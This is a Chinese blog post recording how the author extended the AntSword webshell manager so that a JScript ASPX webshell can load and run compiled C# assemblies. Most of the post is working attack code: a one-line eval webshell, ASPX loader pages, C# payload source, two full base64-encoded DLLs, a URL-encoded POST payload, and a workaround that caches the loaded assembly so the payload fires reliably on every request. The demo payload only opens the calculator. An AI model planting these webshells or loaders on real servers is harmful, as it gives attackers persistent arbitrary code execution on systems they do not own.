# Jscript加载Assembly踩坑记


<meta name="referrer" content="no-referrer" />

## 前言

最近想要给As-Exploits增加aspx类型的支持，就研究了一下冰蝎跟哥斯拉的实现。

由于冰蝎跟哥斯拉都采用的C#类型的shell，所以可以直接调用系统的一些api，并且可以加载任意的shellcode。而蚁剑采用的是传统的Jscript。就想找个办法把它们两者结合起来，用Jscript加载C#的assembly，以此来达到兼容原有shell类型的目的。

但是在实现的过程中踩了一些坑，所以就写下这篇文章记录一下。

## 理论支持

### Assembly

这里要先提到一个概念叫Assembly，引用一下rebeyond师傅文章中的话：https://xz.aliyun.com/t/2758

> 在Java中，每个类经过编译之后都单独对应一个class文件，而在.net中则不同，.net中不存在单个类对应的二进制文件，而是引入了一个叫做Assembly（程序集）的概念，已编译的类是以Assembly的形式来承载的，Assembly是供CLR执行的可执行文件。在.NET下，托管的DLL和EXE都称之为Assembly，一个Assembly可以包含多个类。

java跟.net有很多相似之处，这里我们可以简单的理解为：.net中的assembly就像java中的class。java中使用defineClass来加载一个类到jvm内存中，同样，.net中可以使用Assembly.Load来把assembly加载到内存中。

### 从Jscript到C#

蚁剑用的是Jscript，然而冰蝎哥斯拉用的C#，那么能否用Jscript去调用C#呢？

答案是可以的，这里附一张.net framework的框架图

![image](https://cdn.nlark.com/yuque/0/2021/png/1599908/1611631244033-5fc17c40-78d4-4345-b999-67d103ece651.png)



可以看到最顶层的如C#,VB,Jscript等语言，他们的底层框架都是通用的，都是在.net framework这个体系内。所以C#编译成的assembly在Jscript中是可以通用的。



那么Jscript如何将其加载进去呢？由于其中部分基类库Base Class Library(BCL)是共有的。而Assembly.Load刚好在System.Reflection这个命名空间下面，所以我们就可以在Jscript中调用System.Reflection.Assembly.Load来把C#的assembly加载到内存中。



这里可能会有同学问了，既然Jscript也是一门独立的语言，理论上C#能实现的他都能实现，为什么还要大费周折再去加载C#呢？

其实也不是没有想过直接用Jscript写。。。但是在实现的过程中发现太蛋疼了，Jscript基本搜不到什么文档，报错也搜不到，本人测试过VS，VS code，rider，都没有Jscript的补全跟高亮，开发起来非常难受。另外一个原因是很多开源工具都用的C#实现，采用assembly加载的方式稍微修改一下就可以快速复用。

## 踩坑过程

前面扯了这么多主要是理论，当然实现中没有这么顺利。



首先新建一个Class Library项目，这里以弹计算器为例。

```
using System.Diagnostics;

namespace AntPayload
{
    public class Run
    {
        public override bool Equals(object obj)
        {
            Process.Start("calc.exe");
            return true;
        }
    }
}
```

项目自动编译或者手动编译为dll

```
csc /t:library AntPayload.cs
```

base64一下

```
base64 -w 0 AntPayload.dll > AntPayload.txt
```

Payload

```
TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAEXJD2AAAAAAAAAAAOAAIiALATAAAAgAAAAGAAAAAAAANicAAAAgAAAAQAAAAAAAEAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAACAAAAAAgAAAAAAAAMAQIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAOQmAABPAAAAAEAAAIgDAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAwAAACsJQAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAPAcAAAAgAAAACAAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAAIgDAAAAQAAAAAQAAAAKAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAADgAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAAAYJwAAAAAAAEgAAAACAAUAaCAAAEQFAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADZyAQAAcCgOAAAKJhcqHgIoDwAACioAAEJTSkIBAAEAAAAAAAwAAAB2Mi4wLjUwNzI3AAAAAAUAbAAAAMwBAAAjfgAAOAIAACQCAAAjU3RyaW5ncwAAAABcBAAAFAAAACNVUwBwBAAAEAAAACNHVUlEAAAAgAQAAMQAAAAjQmxvYgAAAAAAAAACAAABRxUAAAkAAAAA+gEzABYAAAEAAAAQAAAAAgAAAAIAAAABAAAADwAAAA0AAAABAAAAAgAAAAAAbgEBAAAAAAAGAN8AzgEGAEwBzgEGACwAnAEPAO4BAAAGAFQAhAEGAMIAhAEGAKMAhAEGADMBhAEGAP8AhAEGABgBhAEGAGsAhAEGAEAArwEGAB4ArwEGAIYAhAEGAAwCfQEKAAQCnAEAAAAAAQAAAAAAAQABAAEAEAAZAhMAPQABAAEAUCAAAAAAxgD9ASkAAQBeIAAAAACGGJYBBgACAAAAAQBqAQkAlgEBABEAlgEGABkAlgEKACkAlgEQADEAlgEQADkAlgEQAEEAlgEQAEkAlgEQAFEAlgEQAFkAlgEQAGEAlgEVAGkAlgEQAHEAlgEQAIEAEwIaAHkAlgEGAC4ACwAuAC4AEwA3AC4AGwBWAC4AIwBfAC4AKwBvAC4AMwBvAC4AOwBvAC4AQwBfAC4ASwB1AC4AUwBvAC4AWwBvAC4AYwCNAC4AawC3AASAAAABAAAAAAAAAAAAAAAAABMAAAACAAAAAAAAAAAAAAAgAAoAAAAAAAIAAAAAAAAAAAAAACAAfQEAAAAAAAAAPE1vZHVsZT4AbXNjb3JsaWIAQW50UGF5bG9hZABHdWlkQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAG9iagBBbnRQYXlsb2FkLmRsbABTeXN0ZW0AU3lzdGVtLlJlZmxlY3Rpb24ALmN0b3IAU3lzdGVtLkRpYWdub3N0aWNzAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAEVxdWFscwBQcm9jZXNzAE9iamVjdABTdGFydABSdW5UZXN0AAAAAAARYwBhAGwAYwAuAGUAeABlAAAADuw7XR6MQkeND6FGq61D8gAEIAEBCAMgAAEFIAEBEREEIAEBDgQgAQECBQABEkEO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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==
```

新建web项目，建立test.aspx测试一下

```
<%@ Page Language="Jscript" Debug=true%>
<%
    var Payload =Request.Form("data");
    var myAssebly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));
    var myPaylaod=myAssebly.CreateInstance("AntPayload.Run").Equals(this);
    myPaylaod.Equals(this);
%>
```



POST：

```
data=xxxx(上文中的payload)
```



![image.png](https://cdn.nlark.com/yuque/0/2021/png/1599908/1611633232056-b2c8ef30-8d5c-4902-b9ed-d0ee60480a78.png)

可以证实我们的猜想是成功的，可以用Jscript调用System.Reflection.Assembly.Load执行C#的payload。

由于蚁剑的aspx一句话是基于jscript的eval的，所以还要通过一层eval给他传进去。

web项目中新建base.aspx

```
<%@ Page Language="Jscript" Debug=true%><%eval(Request.Item["ant"],"unsafe");%>
```

POST:

```
ant=var%20Payload%20%3D%22xxxxxxxxx%22%3B%0Avar%20myAssebly%20%3D%20System.Reflection.Assembly.Load(Convert.FromBase64String(Payload))%3B%0Avar%20myPaylaod%3DmyAssebly.CreateInstance(%22AntPayload.Run%22).Equals(this)%3B%0AmyPaylaod.Equals(this)%3B
```

发现第一次是可以正常调用的

![image.png](https://cdn.nlark.com/yuque/0/2021/png/1599908/1611646490580-34f8d7bb-c91d-473c-9364-a8e39e98a277.png)

但是第二次执行就会提示下面的错误

![image.png](https://cdn.nlark.com/yuque/0/2021/png/1599908/1611646514517-119e0355-d225-4f92-9ecf-07a57c564ca3.png)

```
[A]AntPayload.Run 无法强制转换为 [B]AntPayload.Run。类型 A 源自“AntPayload, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null”(在字节数组的上下文“LoadNeither”中)。类型 B 源自“AntPayload, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null”(在字节数组的上下文“LoadNeither”中)。
```

搜了一下发现没有什么有用的回答，猜测大概是跟java中类重复加载一样的报错。

所以就加了一层判断，如果当前存在 AntPayload.Run 这个类型的assembly就不重复进行加载。

新建项目test0.aspx测试一下

```
 <%@ Page Language="Jscript" Debug=true%>
<%
 var Payload="TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAP2QD2AAAAAAAAAAAOAAIiALATAAAAgAAAAGAAAAAAAAMicAAAAgAAAAQAAAAAAAEAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAACAAAAAAgAAAAAAAAMAQIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAOAmAABPAAAAAEAAAIgDAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAwAAACoJQAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAOAcAAAAgAAAACAAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAAIgDAAAAQAAAAAQAAAAKAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAADgAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAAAUJwAAAAAAAEgAAAACAAUAaCAAAEAFAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADZyAQAAcCgOAAAKJhcqHgIoDwAACioAAEJTSkIBAAEAAAAAAAwAAAB2Mi4wLjUwNzI3AAAAAAUAbAAAAMwBAAAjfgAAOAIAACACAAAjU3RyaW5ncwAAAABYBAAAFAAAACNVUwBsBAAAEAAAACNHVUlEAAAAfAQAAMQAAAAjQmxvYgAAAAAAAAACAAABRxUAAAkAAAAA+gEzABYAAAEAAAAQAAAAAgAAAAIAAAABAAAADwAAAA0AAAABAAAAAgAAAAAAbgEBAAAAAAAGAN8A0gEGAEwB0gEGACwAoAEPAPIBAAAGAFQAhAEGAMIAhAEGAKMAhAEGADMBhAEGAP8AhAEGABgBhAEGAGsAhAEGAEAAswEGAB4AswEGAIYAhAEGABACfQEKAAgCoAEAAAAAAQAAAAAAAQABAAEAEACWARMAPQABAAEAUCAAAAAAxgABAikAAQBeIAAAAACGGJoBBgACAAAAAQBqAQkAmgEBABEAmgEGABkAmgEKACkAmgEQADEAmgEQADkAmgEQAEEAmgEQAEkAmgEQAFEAmgEQAFkAmgEQAGEAmgEVAGkAmgEQAHEAmgEQAIEAFwIaAHkAmgEGAC4ACwAuAC4AEwA3AC4AGwBWAC4AIwBfAC4AKwBvAC4AMwBvAC4AOwBvAC4AQwBfAC4ASwB1AC4AUwBvAC4AWwBvAC4AYwCNAC4AawC3AASAAAABAAAAAAAAAAAAAAAAABMAAAACAAAAAAAAAAAAAAAgAAoAAAAAAAIAAAAAAAAAAAAAACAAfQEAAAAAAAAAPE1vZHVsZT4AbXNjb3JsaWIAQW50UGF5bG9hZABHdWlkQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAG9iagBBbnRQYXlsb2FkLmRsbABTeXN0ZW0AU3lzdGVtLlJlZmxlY3Rpb24AUnVuAC5jdG9yAFN5c3RlbS5EaWFnbm9zdGljcwBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dpbmdNb2RlcwBFcXVhbHMAUHJvY2VzcwBPYmplY3QAU3RhcnQAAAAAABFjAGEAbABjAC4AZQB4AGUAAAA945IL3EDlTKxPqJUA/SMAAAQgAQEIAyAAAQUgAQEREQQgAQEOBCABAQIFAAESQQ4It3pcVhk04IkEIAECHAgBAAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEIAQACAAAAAAAPAQAKQW50UGF5bG9hZAAABQEAAAAAFwEAEkNvcHlyaWdodCDCqSAgMjAyMQAAKQEAJDUzMTY4RUI2LThBMTgtNDAzRS1CQzQ2LUJGNTY1RkRBMUFFNgAADAEABzEuMC4wLjAAAAAAAAD9kA9gAAAAAAIAAAAcAQAAxCUAAMQHAABSU0RTOaWA97zcx0qN4uxJUEp93wEAAABEOlxSaWRlclByb2plY3RzXERsbFRlc3RcQW50UGF5bG9hZFxvYmpcUmVsZWFzZVxBbnRQYXlsb2FkLnBkYgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgnAAAAAAAAAAAAACInAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUJwAAAAAAAAAAAAAAAF9Db3JEbGxNYWluAG1zY29yZWUuZGxsAAAAAAD/JQAgABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAQAAAAGAAAgAAAAAAAAAAAAAAAAAAAAQABAAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAASAAAAFhAAAAsAwAAAAAAAAAAAAAsAzQAAABWAFMAXwBWAEUAUgBTAEkATwBOAF8ASQBOAEYATwAAAAAAvQTv/gAAAQAAAAEAAAAAAAAAAQAAAAAAPwAAAAAAAAAEAAAAAgAAAAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAAAAAAJAAEAAAAVAByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAAALAEjAIAAAEAUwB0AHIAaQBuAGcARgBpAGwAZQBJAG4AZgBvAAAAaAIAAAEAMAAwADAAMAAwADQAYgAwAAAAGgABAAEAQwBvAG0AbQBlAG4AdABzAAAAAAAAACIAAQABAEMAbwBtAHAAYQBuAHkATgBhAG0AZQAAAAAAAAAAAD4ACwABAEYAaQBsAGUARABlAHMAYwByAGkAcAB0AGkAbwBuAAAAAABBAG4AdABQAGEAeQBsAG8AYQBkAAAAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADEALgAwAC4AMAAuADAAAAA+AA8AAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAEEAbgB0AFAAYQB5AGwAbwBhAGQALgBkAGwAbAAAAAAASAASAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAQwBvAHAAeQByAGkAZwBoAHQAIACpACAAIAAyADAAMgAxAAAAKgABAAEATABlAGcAYQBsAFQAcgBhAGQAZQBtAGEAcgBrAHMAAAAAAAAAAABGAA8AAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBuAGEAbQBlAAAAQQBuAHQAUABhAHkAbABvAGEAZAAuAGQAbABsAAAAAAA2AAsAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAAEEAbgB0AFAAYQB5AGwAbwBhAGQAAAAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADEALgAwAC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMQAuADAALgAwAC4AMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAADAAAADQ3AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="; 
    var type = Type.GetType("AntPayload.Run");
    if (type != null)
    {
        Response.Write(type + " exists");
        //var obj=System.Activator.CreateInstance(type);
        //obj.Equals("");
        var assembly = System.Reflection.Assembly.GetExecutingAssembly();
        var obj = assembly.CreateInstance("AntPayload.Run");
        obj.Equals("");
    }
    else
    {
        Response.Write(type + " not exists");
        var myAssebly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));
        var myPaylaod = myAssebly.CreateInstance("AntPayload.Run");
        myPaylaod.Equals("");
        //myAssebly.GetType("AntPayload.Run").GetConstructor(new Type[0]).Invoke(null).Equals("");
        
    }
%>
```

发现 Type.GetType 永远为undefined。以为是函数用的不对，后来又换了System.Reflection.Assembly.GetCallingAssembly().GetType，System.Reflection.Assembly.GetExecutingAssembly().GetType都不行。

接着发现虽然把代码直接写在jscript中可以多次稳定触发，如果把以上代码通过eval打进入仍然会报上面类型转换的错误。

![image.png](https://cdn.nlark.com/yuque/0/2021/png/1599908/1611646712047-0bef66ad-7558-4637-9cb8-6c7f971a73c9.png)

另外还发现一些奇怪的地方，如果直接代码写在jscript文件中可以用这种写法：

```
        var obj=System.Activator.CreateInstance(type);
        obj.Equals("");
```

但是如果通过eval传进去就只能用这种写法

```
        var assembly = System.Reflection.Assembly.GetExecutingAssembly();
        var obj = assembly.CreateInstance("AntPayload.Run");
        obj.Equals("");
```

否则会报如下错误，谷歌也没查到怎么解决，神秘。

![image.png](https://cdn.nlark.com/yuque/0/2021/png/1599908/1611648974375-35bf8f84-b053-4b04-84dd-9a4f405c2543.png)



## 问题解决

试了很多办法都失败了，后来谷歌搜到了一篇[2012年的博客](https://evolpin.wordpress.com/2012/11/11/invalidcastexception-when-using-assembly-loadfile/)遇到了同样的问题，大概意思是说两次的assembly被加载到了不同的上下文中，所以被当作成为不同的类，无法进行类型转换。

跟北辰师傅研究了一番后，北辰师傅想到一种方法：把第一次加载后的assembly的引用给存到当前Application的上下文中，即HttpContext.Current.Application这个类里面，然后再通过Application.Get("ant")拿到引用，然后反射，再获取实例化，这样就可以解决上下文不同的问题。

payload修改如下

```
var Payload="xxxxx";
HttpContext.Current.Application.Add("ant", System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)));
HttpContext.Current.Application.Get("ant").GetType("AntPayload.Run").GetConstructor(new Type[0]).Invoke(null).Equals(this);
```

然后通过eval打过去，此时就可以多次稳定触发payload了。

![image.png](https://cdn.nlark.com/yuque/0/2021/png/1599908/1611647475255-93c68208-03b8-4790-bf97-a6f60b9e0215.png)

## 最后

特别感谢北辰师傅的交流探讨！

初学.net，有些地方是凭借自己的理解写的，如果有说的不对的地方欢迎指出，以免误导他人。